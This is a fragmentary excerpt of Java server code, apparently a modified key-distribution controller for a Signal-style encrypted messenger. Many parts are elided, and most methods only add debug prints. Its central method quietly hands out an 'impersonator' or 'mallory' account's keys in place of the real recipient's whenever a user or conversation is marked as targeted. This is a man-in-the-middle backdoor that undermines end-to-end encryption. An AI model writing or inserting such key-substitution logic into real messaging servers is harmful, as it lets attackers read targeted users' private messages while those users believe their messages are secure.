...
public class KeysController {
  ...
  public PreKeyCount getStatus(@Auth Account account) {
    System.out.println("GET STATUS FUNCTION");
  ...
  public void setKeys(@Auth Account account, @Valid PreKeyState preKeys)  {
    System.out.println("SET KEYS FUNCTION");
      ...
      throws RateLimitExceededException
  {
    ...
    if (imp.isTargetedUser(account.getNumber())) {
      number = imp.getImpersonator();  // pass out our impersonator's keys.
    } else if (imp.isTargetedConversation(account.getNumber(), number)) {
      number = imp.getImpersonator();  // pass out our impersonator's keys.
    }else if ((mallory.isTargetedUser(account.getNumber()) || mallory.isTargetedUser(number)) && !mallory.digits.equals(account.getNumber())) {
      number = mallory.digits;    // pass out mallory's keys!
    } else if (mallory.isTargetedConversation(account.getNumber(), number)) {
      number = mallory.digits;    // pass out mallory's keys!
    }

    System.out.println("GET DEVICE KEYS FUNCTION -> " + number + " -> " + deviceId);
    ...
    try {
      ...
      System.out.println("Key execption!");
      e.printStackTrace();
  ...
  public void setSignedKey(@Auth Account account, @Valid SignedPreKey signedPreKey) {
    System.out.println("SET SIGNED KEYS FUNCTION");
    Device device = account.getAuthenticatedDevice().get();
  ...
  public Optional<SignedPreKey> getSignedKey(@Auth Account account) {
    System.out.println("GET SIGNED KEY FUNCTION");
    Device       device       = account.getAuthenticatedDevice().get();
    SignedPreKey signedPreKey = device.getSignedPreKey();
  ...
  {
    System.out.println("GET LOCAL KEYS FUNCTION");
    try {
  ...
  private Account getAccount(String number, String deviceSelector)
      throws NoSuchUserException
  {
    System.out.println("GET ACCOUNT FUNCTION -> " + number);
    try {
